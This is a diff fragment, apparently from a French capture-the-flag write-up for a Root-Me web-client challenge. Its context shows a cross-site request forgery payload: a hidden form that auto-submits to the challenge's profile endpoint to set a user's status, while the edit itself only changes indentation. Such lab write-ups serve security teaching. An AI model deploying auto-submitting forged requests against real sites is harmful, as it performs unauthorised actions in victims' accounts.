@@ -18,8 +18,8 @@ on as donc le code ci-dessous :
 
 ```html
 <form id="form" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
- 	<input type="text" name="username" value="zeobuilder10">
- 	<input type="checkbox" name="status" checked >
+  <input type="text" name="username" value="zeobuilder10">
+  <input type="checkbox" name="status" checked >
   <button type="submit">Submit</button>
 </form>
 <script>document.getElementById("form").submit()</script>
